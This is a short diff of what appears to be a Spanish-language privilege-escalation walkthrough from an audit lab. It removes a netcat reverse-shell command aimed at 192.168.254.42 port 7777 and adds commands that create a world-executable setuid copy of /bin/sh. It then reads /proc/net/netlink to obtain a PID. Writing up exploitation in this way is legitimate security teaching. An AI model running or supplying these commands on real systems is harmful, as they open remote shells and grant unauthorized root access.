@@ -269,12 +269,9 @@ La mecánica del ataque es la siguiente:
 Mientras tanto en la kali ejecutaremos los siguientes comandos
 
 ```
-echo "#!/bin/bash" > /tmp/run
-echo "nc 192.168.254.42 7777 -e /bin/bash" >> /tmp/run
-```
-
-En la máquina auditada tendremos que observar el PID para pasárselo al ejecutable.
-
+echo '#!/bin/sh' > /tmp/run
+echo 'cp /bin/sh /tmp/rootshell && chmod 4777 /tmp/rootshell' >> /tmp/run
+chmod +x /tmp/run
 ```
 cat /proc/net/netlink
 ```
